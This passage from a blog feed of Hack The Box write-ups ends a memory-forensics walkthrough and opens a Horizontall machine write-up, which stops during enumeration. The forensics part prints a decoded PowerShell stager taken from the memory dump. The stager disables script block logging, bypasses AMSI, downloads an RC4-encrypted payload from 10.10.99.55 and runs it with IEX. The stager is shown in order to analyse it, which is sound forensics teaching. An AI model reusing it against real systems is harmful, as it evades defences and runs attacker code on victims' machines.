0x1fd9a3e0      TCPv4   0.0.0.0 <span style="color:#ae81ff">554</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
0x1fd9a3e0      TCPv6   ::      <span style="color:#ae81ff">554</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
0x1fdb3630      TCPv4   10.10.100.43    <span style="color:#ae81ff">49236</span>   10.10.20.166    <span style="color:#ae81ff">143</span>     ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
</code></pre></div><p>What stood out to me was these line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x1fc04490      TCPv4   10.10.100.43    <span style="color:#ae81ff">49246</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
0x1fc3d320      TCPv4   10.10.100.43    <span style="color:#ae81ff">49247</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
</code></pre></div><p>Even though these connections were closed, there are some alarming signs:</p>
<ol>
<li>That there is <code>powershell.exe</code>, even though it might be benign, it is possible that this might be used for setting up reverse shell.</li>
<li>That there is communication with port &ldquo;80&rdquo; using <code>powershell.exe</code>. This stoods out because a normal user (who is not that techsavvy) won&rsquo;t use &ldquo;powershell.exe&rdquo; to communicate with a website.</li>
</ol>
<p>Let&rsquo;s dump out the command that would&rsquo;ve been used to call <code>powershell.exe</code> to investigate.</p>
<p><strong>Getting command run by using <code>windows.cmdline</code></strong></p>
<ul>
<li>We can get all the commands that were used to run the process using the command:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline
</code></pre></div><ul>
<li>But to only get the command of a particular process, we can use PID with <code>--pid</code> flag</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline --pid <span style="color:#ae81ff">2752</span>                                                                                                                                            <span style="color:#ae81ff">2</span> ⨯
Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
Progress:  100.00               PDB scanning finished
PID     Process Args

<span style="color:#ae81ff">2752</span>    powershell.exe  <span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> -noP -sta -w <span style="color:#ae81ff">1</span> -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA<span style="color:#f92672">=</span>
</code></pre></div><p>So <code>powershell.exe</code> is called with <code>-enc</code> command which uses base64 encoding.</p>
<p>On decoding this encoding:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo -n JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA<span style="color:#f92672">=</span> |base64 -d

$GroUPPOLiCYSEttINGs <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>rEF<span style="color:#f92672">]</span>.ASseMBLY.GEtTypE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;System.Management.Automation.Utils&#39;</span><span style="color:#f92672">)</span>.<span style="color:#e6db74">&#34;GEtFIE`ld&#34;</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cachedGroupPolicySettings&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>+<span style="color:#e6db74">&#39;onPublic,Static&#39;</span><span style="color:#f92672">)</span>.GETValUe<span style="color:#f92672">(</span>$nulL<span style="color:#f92672">)</span>;$GRouPPOlICySeTTiNgS<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;EnableScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0;$GRouPPOLICYSEtTingS<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;EnableScriptBlockInvocationLogging&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0;<span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.AsSemBly.GeTTyPE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color:#f92672">)</span>|?<span style="color:#f92672">{</span>$_<span style="color:#f92672">}</span>|%<span style="color:#f92672">{</span>$_.GEtFieLd<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span><span style="color:#f92672">)</span>.SETVaLuE<span style="color:#f92672">(</span>$NulL,$True<span style="color:#f92672">)}</span>;<span style="color:#f92672">[</span>SysTem.NeT.SErVIcePOIntMAnAgER<span style="color:#f92672">]</span>::ExpEct100COnTinuE<span style="color:#f92672">=</span>0;$WC<span style="color:#f92672">=</span>NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;$wC.HeaDerS.Add<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;User-Agent&#39;</span>,$u<span style="color:#f92672">)</span>;$Wc.PRoXy<span style="color:#f92672">=[</span>SysTeM.NET.WebRequEst<span style="color:#f92672">]</span>::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>SYSTeM.NET.CreDEnTiaLCaChe<span style="color:#f92672">]</span>::DeFauLTNEtwOrkCredentiAlS;$K<span style="color:#f92672">=[</span>SYStEM.Text.ENCODIng<span style="color:#f92672">]</span>::ASCII.GEtBytEs<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;E1gMGdfT@eoN&gt;x9{]2F7+bsOn4/SiQrw&#39;</span><span style="color:#f92672">)</span>;$R<span style="color:#f92672">={</span>$D,$K<span style="color:#f92672">=</span>$ArgS;$S<span style="color:#f92672">=</span>0..255;0..255|%<span style="color:#f92672">{</span>$J<span style="color:#f92672">=(</span>$J+$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]</span>+$K<span style="color:#f92672">[</span>$_%$K.CounT<span style="color:#f92672">])</span>%256;$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$J<span style="color:#f92672">]=</span>$S<span style="color:#f92672">[</span>$J<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]}</span>;$D|%<span style="color:#f92672">{</span>$I<span style="color:#f92672">=(</span>$I+1<span style="color:#f92672">)</span>%256;$H<span style="color:#f92672">=(</span>$H+$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">])</span>%256;$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">]=</span>$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>;$_-bxoR$S<span style="color:#f92672">[(</span>$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>+$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">])</span>%256<span style="color:#f92672">]}}</span>;$wc.HEAdErs.ADD<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Cookie&#34;</span>,<span style="color:#e6db74">&#34;session=MCahuQVfz0yM6VBe8fzV9t9jomo=&#34;</span><span style="color:#f92672">)</span>;$ser<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://10.10.99.55:80&#39;</span>;$t<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/login/process.php&#39;</span>;$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HTB{$_j0G_********0rY_$}&#39;</span>;$DatA<span style="color:#f92672">=</span>$WC.DoWNLoaDDATA<span style="color:#f92672">(</span>$SeR+$t<span style="color:#f92672">)</span>;$iv<span style="color:#f92672">=</span>$daTA<span style="color:#f92672">[</span>0..3<span style="color:#f92672">]</span>;$DAta<span style="color:#f92672">=</span>$DaTa<span style="color:#f92672">[</span>4..$DAta.LenGTH<span style="color:#f92672">]</span>;-JOIN<span style="color:#f92672">[</span>CHAr<span style="color:#f92672">[]](</span>&amp; $R $datA <span style="color:#f92672">(</span>$IV+$K<span style="color:#f92672">))</span>|IEX
</code></pre></div><p>We get the flag!</p>
<hr>
<p>This was rather a very simple forensics challenge but I enjoyed it a lot. If you&rsquo;re new to using forensics tool like volatility, this is a simple challenge to get oneself accustomed to it.</p>
<h4 id="now-let-me-shamelessly-ask-you-to">Now, let me shamelessly ask you to</h4>
<p>Follow me on <a href="https://github.com/harshitm98">Github</a>, <a href="https://twitter.com/fake_batman_">Twitter</a>, and connect on <a href="https://linkedin.com/in/harshitm98">LinkedIn</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB Horizontall - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-horizontall/</link>
            <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-horizontall/</guid>
            <description>Enumeration Before we start enumeration, let&amp;rsquo;s add IP 10.10.11.105 to /etc/hosts as horizontall.htb
/etc/hosts:
10.10.11.105 horizontall.htb Initial Scans Nmap Scan
# Nmap 7.91 scan initiated Thu Dec 30 19:29:02 2021 as: nmap -vv --reason -Pn --min-rate=10000 -sV -sC --version-all -oN /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/_quick_tcp_nmap.txt -oX /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/xml/_quick_tcp_nmap.xml horizontall.htb Increasing send delay for 10.10.11.105 from 0 to 5 due to 223 out of 743 dropped probes since last increase. Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<p>Before we start enumeration, let&rsquo;s add IP <code>10.10.11.105</code> to <code>/etc/hosts</code> as <code>horizontall.htb</code></p>
<p><em>/etc/hosts</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.11.105    horizontall.htb
</code></pre></div><h2 id="initial-scans">Initial Scans</h2>
<p>Nmap Scan</p>
<pre><code class="language-nmap" data-lang="nmap"># Nmap 7.91 scan initiated Thu Dec 30 19:29:02 2021 as: nmap -vv --reason -Pn --min-rate=10000 -sV -sC --version-all -oN /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/_quick_tcp_nmap.txt -oX /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/xml/_quick_tcp_nmap.xml horizontall.htb
Increasing send delay for 10.10.11.105 from 0 to 5 due to 223 out of 743 dropped probes since last increase.
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up, received user-set (0.046s latency).
Scanned at 2021-12-30 19:29:02 EST for 13s
Not shown: 995 closed ports
Reason: 995 conn-refused
PORT     STATE    SERVICE REASON      VERSION
22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp   open     http    syn-ack     nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 19:29:15 2021 -- 1 IP address (1 host up) scanned in 13.57 seconds
</code></pre><ul>
<li>Only port 22, 80 are open</li>
</ul>
<h3 id="ffuf-scans">ffuf scans</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic -of html -o f_big.html

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Output file      : f_big.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

img                     <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
                        <span style="color:#f92672">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span style="color:#f92672">]</span>
css                     <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
js                      <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
